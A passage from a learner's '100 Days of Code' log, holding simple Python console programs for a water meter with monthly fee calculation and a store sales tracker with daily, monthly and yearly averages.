            print("4. Exit")
            choice = input("Enter your choice: ")
            if choice == "1":
                self.add_water_used(float(input("Enter the amount of water used: ")))
            elif choice == "2":
                self.display_info()
            elif choice == "3":
                self.calculate_yesterday_water_used()
                self.display_yesterday_water_used()
            elif choice == "4":
                break
            else:
                print("Invalid choice. Please try again.")

if __name__ == "__main__":
    water_meter = WaterMeter()
    water_meter.main()

DAY 18
====================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-18
### Description: This is the  18th day of the 100 Days of Code challenge. 
### The task is to create a program that simulates a water meter. The program should be able to add water used, display the the amount of fees charged for month.

from datetime import datetime

class WaterMeter:
    def __init__(self):
        self.total_water_used = 0
        self.water_used_monthly = {}
        self.current_date = datetime.now()
        self.fees_per_unit = 0.5

    def add_water_used(self, amount):
        self.total_water_used += amount
        current_month = self.current_date.strftime("%B")
        if current_month in self.water_used_monthly:
            self.water_used_monthly[current_month] += amount
        else:
            self.water_used_monthly[current_month] = amount

    def display_info(self):
        print(f"Current Date and Time: {self.current_date}")
        print(f"Total Water Used: {self.total_water_used} units")

    def display_monthly_water_used(self):
        for month, amount in self.water_used_monthly.items():
            print(f"{month}: {amount} units")

    def calculate_monthly_fees(self):
        for month, amount in self.water_used_monthly.items():
            fees = amount * self.fees_per_unit
            print(f"{month} fees: ${fees:.2f}")

    def main(self):
        while True:
            print("1. Add Water Used")
            print("2. Display Info")
            print("3. Display Monthly Water Used")
            print("4. Calculate Monthly Fees")
            print("5. Exit")
            choice = input("Enter your choice: ")
            if choice == "1":
                self.add_water_used(float(input("Enter the amount of water used: ")))
            elif choice == "2":
                self.display_info()
            elif choice == "3":
                self.display_monthly_water_used()
            elif choice == "4":
                self.calculate_monthly_fees()
            elif choice == "5":
                break
            else:
                print("Invalid choice. Please try again.")

if __name__ == "__main__":
    water_meter = WaterMeter()
    water_meter.main()

DAY 19
========================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-18
### Description: This is the  19th day of the 100 Days of Code challenge. 
### The task is to create a program that displays the amount of product sold by a store. The program should be able to add products, display the total amount of products in one year
### and calculate the average amount of products sold per day.
### The program should also be able
### to display the total amount of products sold in a specific month and the average amount of products sold
### in a specific month.
### The program should also be able to display the total amount of products sold in a specific year and the average profit they earn yearly
### the average amount of products sold in a specific year.

from datetime import datetime

class Product:
    def __init__(self, name, price, quantity):
        self.name = name
        self.price = price
        self.quantity = quantity

class Store:
    def __init__(self):
        self.products = {}
        self.sales = {}

    def add_product(self, product):
        self.products[product.name] = product

    def remove_product(self, product_name):
        if product_name in self.products:
            del self.products[product_name]
        else:
            print("Product not found.")

    def add_sale(self, product_name, quantity, date):
        if product_name in self.products:
            if date in self.sales:
                self.sales[date].append((product_name, quantity))
            else:
                self.sales[date] = [(product_name, quantity)]
        else:
            print("Product not found.")

    def display_total_sales(self):
        total_sales = 0
        for date, sales in self.sales.items():
            for product_name, quantity in sales:
                total_sales += self.products[product_name].price * quantity
        print(f"Total sales: ${total_sales:.2f}")

    def display_average_daily_sales(self):
        total_sales = 0
        total_days = len(self.sales)
        for date, sales in self.sales.items():
            for product_name, quantity in sales:
                total_sales += self.products[product_name].price * quantity
        average_daily_sales = total_sales / total_days
        print(f"Average daily sales: ${average_daily_sales:.2f}")

    def display_monthly_sales(self, month):
        monthly_sales = 0
        for date, sales in self.sales.items():
            if date.startswith(month):
                for product_name, quantity in sales:
                    monthly_sales += self.products[product_name].price * quantity
        print(f"Monthly sales for {month}: ${monthly_sales:.2f}")

    def display_average_monthly_sales(self, month):
        monthly_sales = 0
        total_days = 0
        for date, sales in self.sales.items():
            if date.startswith(month):
                total_days += 1
                for product_name, quantity in sales:
                    monthly_sales += self.products[product_name].price * quantity
        average_monthly_sales = monthly_sales / total_days
        print(f"Average monthly sales for {month}: ${average_monthly_sales:.2f}")

    def display_yearly_sales(self, year):
        yearly_sales = 0
        for date, sales in self.sales.items():
            if date.startswith(year):
                for product_name, quantity in sales:
                    yearly_sales += self.products[product_name].price * quantity
        print(f"Yearly sales for {year}: ${yearly_sales:.2f}")

    def display_average_yearly_sales(self, year):
        yearly_sales = 0
        total_days = 0
        for date, sales in self.sales.items():
            if date.startswith(year):
                total_days += 1
                for product_name, quantity in sales:
                    yearly_sales += self.products[product_name].price * quantity
        average_yearly_sales = yearly_sales / total_days
        print(f"Average yearly sales for {year}: ${average_yearly_sales:.2f}")

def main():
    store = Store()
    while True:
        print("\n1. Add product")
        print("2. Remove product")
        print("3. Add sale")
        print("4. Display total sales")
        print("5. Display average daily sales")
        print("6. Display monthly sales")
        print("7. Display average monthly sales")
        print("8. Display yearly sales")
        print("9. Display average yearly sales")
        print("10. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            name = input("Enter product name: ")
            price = float(input("Enter product price: "))
            quantity = int(input("Enter product quantity: "))
            store.add_product(Product(name, price, quantity))
        elif choice == "2":
            name = input("Enter product name: ")
            store.remove_product(name)
        elif choice == "3":
            name = input("Enter product name: ")
            quantity = int(input("Enter sale quantity: "))
            date = input("Enter sale date (YYYY-MM-DD): ")
            store.add_sale(name, quantity, date)
        elif choice == "4":
            store.display_total_sales()
        elif choice == "5":
            store.display_average_daily_sales()
        elif choice == "6":
            month = input("Enter month (YYYY-MM): ")
            store.display_monthly_sales(month)
        elif choice == "7":
            month = input("Enter month (YYYY-MM): ")
            store.display_average_monthly_sales(month)
        elif choice == "8":
            year = input("Enter year (YYYY): ")
            store.display_yearly_sales(year)
        elif choice == "9":
            year = input("Enter year (YYYY): ")
            store.display_average_yearly_sales(year)
        elif choice == "10":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

